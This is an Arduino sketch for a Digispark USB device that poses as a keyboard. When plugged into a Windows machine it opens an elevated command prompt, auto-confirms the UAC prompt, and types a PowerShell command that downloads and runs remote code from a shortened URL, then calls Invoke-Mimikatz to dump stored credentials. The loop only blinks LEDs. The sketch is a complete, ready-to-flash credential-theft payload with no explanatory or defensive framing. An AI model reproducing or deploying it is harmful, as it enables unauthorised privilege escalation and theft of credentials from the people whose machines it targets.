  #include "DigiKeyboard.h"

  void setup() {
    DigiKeyboard.update();
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(250);
    DigiKeyboard.write(PSTR(" powershell Start-Process cmd.exe -Verb runAs"));
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(2500);
    DigiKeyboard.sendKeyStroke(KEY_Y,MOD_ALT_LEFT);
    DigiKeyboard.delay(2000);
    DigiKeyboard.write(PSTR(" powershell \@IEX (New-Object Net.WebClient).DownloadString('http://is.gd/oeoFuI'); Invoke-Mimikatz -DumpCreds\@; pause"));
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
  }
  
  
  void loop() {
    digitalWrite(0,HIGH);
    digitalWrite(1,HIGH);
    // this is generally not necessary but with some older systems it seems to
    // prevent missing the first character after a delay:
    DigiKeyboard.update();
    DigiKeyboard.sendKeyStroke(0);
    DigiKeyboard.delay(1000);
    digitalWrite(0,LOW);
    digitalWrite(1,LOW);
    DigiKeyboard.delay(1000);
  }
